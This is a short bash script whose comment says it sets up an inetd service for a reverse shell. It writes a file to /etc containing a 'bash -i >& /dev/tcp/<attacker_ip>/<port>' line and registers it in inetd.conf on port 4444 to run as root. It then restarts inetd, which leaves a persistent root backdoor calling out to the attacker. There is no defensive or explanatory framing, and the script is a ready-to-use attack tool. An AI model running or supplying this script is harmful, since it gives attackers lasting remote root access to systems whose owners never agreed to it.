#!/bin/bash
# inetd_service.sh - Configure an inetd service to initiate a reverse shell.
if [ -z "$1" ] || [ -z "$2" ]; then
   echo "Usage: $0 <attacker_ip> <attacker_port>"
   exit 1
fi
SERVICE_ENTRY="4444 stream tcp nowait root /bin/bash /etc/inetd.rev_shell.sh"
echo '#!/bin/bash
bash -i >& /dev/tcp/'"$1"'/'"$2"' 0>&1' | sudo tee /etc/inetd.rev_shell.sh >/dev/null
sudo chmod +x /etc/inetd.rev_shell.sh
echo $SERVICE_ENTRY | sudo tee -a /etc/inetd.conf
sudo systemctl restart inetd || sudo service inetd restart
echo "Inetd reverse shell service configured."
